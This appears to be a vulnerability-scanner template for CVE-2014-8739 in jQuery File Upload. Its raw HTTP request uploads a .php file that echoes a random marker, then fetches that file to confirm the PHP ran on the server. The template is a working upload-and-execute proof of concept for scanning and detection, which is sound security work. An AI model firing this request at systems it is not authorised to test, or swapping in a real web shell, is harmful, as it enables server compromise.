id: CVE-2014-8739

info:
  name: jQuery File Upload 6.4.4 - Arbitrary File Upload
  author: melmathari
  severity: critical
  description: jQuery File Upload before 9.22 allowed unrestricted file uploads.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2014-8739
    - https://www.exploit-db.com/exploits/35057
  tags: cve,cve2014,jquery,file-upload,rce

variables:
  marker: "{{randstr}}"
  fname: "{{rand_base(6)}}"

http:
  - raw:
      - |
        POST /server/php/ HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW

        ------WebKitFormBoundary7MA4YWxkTrZu0gW
        Content-Disposition: form-data; name="files[]"; filename="{{fname}}.php"
        Content-Type: application/octet-stream

        <?php echo "{{marker}}"; ?>
        ------WebKitFormBoundary7MA4YWxkTrZu0gW--

    matchers:
      - type: status
        status:
          - 200
        internal: true

  - method: GET
    path:
      - "{{BaseURL}}/server/php/files/{{fname}}.php"
    matchers:
      - type: word
        words:
          - "{{marker}}"
